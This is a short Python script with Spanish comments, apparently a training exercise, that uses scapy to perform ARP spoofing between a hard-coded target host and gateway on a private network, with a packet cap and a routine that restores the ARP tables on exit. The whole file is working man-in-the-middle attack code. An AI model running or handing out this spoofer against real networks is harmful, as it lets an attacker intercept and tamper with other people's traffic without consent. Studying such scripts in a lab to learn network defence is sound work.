#!/usr/bin/env python

import scapy.all as scapy
import time
import sys #LIbreria que nos ayuda a dinaminzar el printeo entre otras funciones

def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)

    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast=broadcast/arp_request

    answered_list=scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip,source_ip):#Queremos que una vez ejecutemos el arp spoofer luego vuelva a la normalidad
    destination_mac=get_mac(destination_ip)
    source_mac= get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) #Lo enviamos y lo hacemos 4 veces para asegurar


target_ip="192.168.58.156"  #UNA VEZ ESCANEADO LA RED Y CONOCIENDO EN QUE MAC&IP QUEREMOS ENTRAR
gateway_ip="192.168.58.2"    #ES LO ÚNICO QUE SE VA A MODIFICAR YA QUE LO OTRO ESTÁ APARENTEMENTE AUTOMATIZADO

try:
    numberPackets = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        numberPackets = numberPackets + 2
        print("\r[+]Packets Sent: "+str(numberPackets), end="")
        time.sleep(2)
        if numberPackets==30:
            print("[+] Se ha alcanzado el envío máximo de paquetes, si quiere aumentarlo modifique el script")
            break
except KeyboardInterrupt:
    print("[+] Quitting the application")
    restore(target_ip, gateway_ip)
    restore(gateway_ip,target_ip)